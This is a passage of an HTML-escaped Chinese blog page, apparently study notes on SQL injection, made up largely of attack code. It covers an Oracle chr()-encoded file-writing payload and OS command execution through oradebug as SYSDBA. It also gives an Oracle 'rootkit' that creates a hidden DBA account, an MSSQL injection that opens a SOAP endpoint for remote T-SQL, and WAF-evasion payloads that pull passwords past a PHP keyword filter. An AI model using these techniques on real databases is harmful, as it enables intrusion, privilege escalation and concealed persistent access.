class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;52&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;35&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;148&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;37&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;172&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;148&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;echo ARE YOU SURE? &amp;gt;c:\Unbreakable.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; DUAL&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;自定义应用代码&lt;/p&gt;
&lt;p&gt;在Oracle领域，我们经常使用包含操作系统命令的表，这些命令由连接到数据库的外部程序执行。使用指定的命令更新数据库中这样的条目时，我们经常可以控制系统。检查所有表以寻找包含操作系统命令的列，将命令注入到命令表，等待被执行。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;以SYSDBA执行代码&#34;&gt;&lt;a href=&#34;#以SYSDBA执行代码&#34; class=&#34;headerlink&#34; title=&#34;以SYSDBA执行代码&#34;&gt;&lt;/a&gt;以SYSDBA执行代码&lt;/h5&gt;&lt;p&gt;对于具有SYSDBA权限(比如SYS)的用户来说，使用oradebug(9i R2、10g R2、11g R1或11g R2)调用任意的操作系统命令或DLL/库。以下命令中的空格字符必须使用tab字符来代替：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;sqlplus	sys&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;pw&lt;span class=&#34;token variable&#34;&gt;@dbserver&lt;/span&gt;	&lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt;	sysdba
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;oradebug	setmypid
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;oradebug	&lt;span class=&#34;token keyword&#34;&gt;call&lt;/span&gt;	system	&lt;span class=&#34;token string&#34;&gt;&#34;/bin/touch	-f	/home/oracle/rds.txt&#34;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Function&lt;/span&gt;	returned	&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;PostgreSQL-5&#34;&gt;&lt;a href=&#34;#PostgreSQL-5&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL&#34;&gt;&lt;/a&gt;PostgreSQL&lt;/h4&gt;&lt;p&gt;执行操作系统命令的方式就是调用用户自定义函数(User-Defined Function, UDF)&lt;/p&gt;
&lt;p&gt;对于存在于本地操作系统之上的共享库，库中将没有magic block声明。我们必须上传具有该声明的我们自己的共享库。在PostgreSQL中，可以将UDF放在PostgreSQL用户具有读/ 写访问权限的任何位置。在Linux/UNIX系统中通常位于/tmp目录，在Windows系统中通常位 于 c:\windows\temp 目录。&lt;/p&gt;
&lt;p&gt;要包含magic block,在已经包含了头文件fmgr.h之外，还需要在源文件的其中一个模块(仅能有一个模块)中包含下面的指令：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# ifdef PG_MODULE_MAGIC&lt;/span&gt;
PG_MODULE_MAGIC&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# endif&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;巩固访问&#34;&gt;&lt;a href=&#34;#巩固访问&#34; class=&#34;headerlink&#34; title=&#34;巩固访问&#34;&gt;&lt;/a&gt;巩固访问&lt;/h3&gt;&lt;p&gt;Oracle rookkit&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- the following code must run as DBA&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;grant&lt;/span&gt; dba &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; hidden identified &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; hidden_2009&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- create a user hidden with DBA privileges&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;kupp$&lt;span class=&#34;token keyword&#34;&gt;proc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;disable_multiprocess &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;-- this SELECT statement is needed for newer version of Oracle (10.2.0.5,11.1.0.7, 11.2.0.x) to activate the identity change&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;kupp$&lt;span class=&#34;token keyword&#34;&gt;proc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;change_user&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SYS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;-- become user SYS &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- change the users record in sys.user$&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;update&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; tempts&lt;span class=&#34;token comment&#34;&gt;#=666 where name=&#39;HIDDEN&#39;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- does not show the user HIDDEN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; username &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_users&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- but the connect works&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;connect&lt;/span&gt; hidden&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;hidden_2009

&lt;span class=&#34;token comment&#34;&gt;#Oracle使用ALL_USERS和DBA_USERS视图来显示用户列表，这些视图包含了三张表的并集。通过将tempts#(或datats#或type#)设置成不存在的值，可以从并集结果和视图中清除用户：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FORCE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VIEW&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SYS&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ALL—USERS&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;USERNAME&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;USER_ID&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;CREATED&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; u&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; u&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#, u.ctime&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ u&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ts$ dts&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ts$ tts
&lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; u&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;datats&lt;span class=&#34;token comment&#34;&gt;# = dts.ts#&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; u&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tempts&lt;span class=&#34;token comment&#34;&gt;# = tts.ts#&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; u&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# = 1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过http.sys(管理IIS的同一内核组件)暴露基于SOAP(简单对象访问协议)的Web服务，使用T-SQL命令启用端点上的批处理时，端点会隐式暴露另一种名为sqlbatch的SOAP 方法。sqlbatch方法可以通过SOAP来执行T-SQL语句。&lt;/p&gt;
&lt;p&gt;我们可以发出请求来创建需要的SOAP 端点：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; exec(&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; ENDPOINT ep2 STATE&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;STARTED &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; HTTP &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AUTHENTICATION &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;INTEGRATED&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;PATH &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sp&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;PORTS&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;CLEAR&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;FOR&lt;/span&gt; SOAP &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;BATCHES&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ENABLED&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上述代码在victim服务器的/sp目录中创建了一个SOAP端点，我们可以在该端点上瞄准 一个SOAP请求（使用嵌入式SQL查询）。&lt;/p&gt;
&lt;h2 id=&#34;高级话题&#34;&gt;&lt;a href=&#34;#高级话题&#34; class=&#34;headerlink&#34; title=&#34;高级话题&#34;&gt;&lt;/a&gt;高级话题&lt;/h2&gt;&lt;h3 id=&#34;避开输入过滤器&#34;&gt;&lt;a href=&#34;#避开输入过滤器&#34; class=&#34;headerlink&#34; title=&#34;避开输入过滤器&#34;&gt;&lt;/a&gt;避开输入过滤器&lt;/h3&gt;&lt;p&gt;Web应用防火墙（WAF）或入侵防御系统（IPS）&lt;/p&gt;
&lt;p&gt;通常会过滤SQL关键词，如select，insert，and等、还有特定字符，如单引号，连接字符、还有空白符&lt;/p&gt;
&lt;h4 id=&#34;使用大小写变种绕过&#34;&gt;&lt;a href=&#34;#使用大小写变种绕过&#34; class=&#34;headerlink&#34; title=&#34;使用大小写变种绕过&#34;&gt;&lt;/a&gt;使用大小写变种绕过&lt;/h4&gt;&lt;p&gt;数据库不区分大小写&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;uNiOn SeLeCt password FrOm tblUsers WhErE username=&#39;&#39; admin&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;使用SQL注释&#34;&gt;&lt;a href=&#34;#使用SQL注释&#34; class=&#34;headerlink&#34; title=&#34;使用SQL注释&#34;&gt;&lt;/a&gt;使用SQL注释&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#过滤器&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;FROM &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;stristr &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Svalue&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;UPDATE &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;WHERE &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;ALTER &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SELECT &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SHUTDOWN &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;CREATE &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;DROP &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;DELETE FROM &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;script &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
stristr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SET &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; die &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Please provide a permitted value for&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对关键字后面跟着的空格检测，使用/**/充当分隔符&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/**/UNION/**/SELECT/**/password/**/FROM/**/tblUsers/**/WHERE/**/username/**/LIKE/**/&#39;&lt;/span&gt;admin&#39;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Mysql中能使用内联注释来避开关键字绕过，sel/**/ect&lt;/p&gt;
&lt;h4 id=&#34;使用URL编码&#34;&gt;&lt;a href=&#34;#使用URL编码&#34; class=&#34;headerlink&#34; title=&#34;使用URL编码&#34;&gt;&lt;/a&gt;使用URL编码&lt;/h4&gt;&lt;p&gt;过滤器能过滤空白符和内联注释序列/*，将序列双URL编码，即对%编码得到%25&lt;/p&gt;
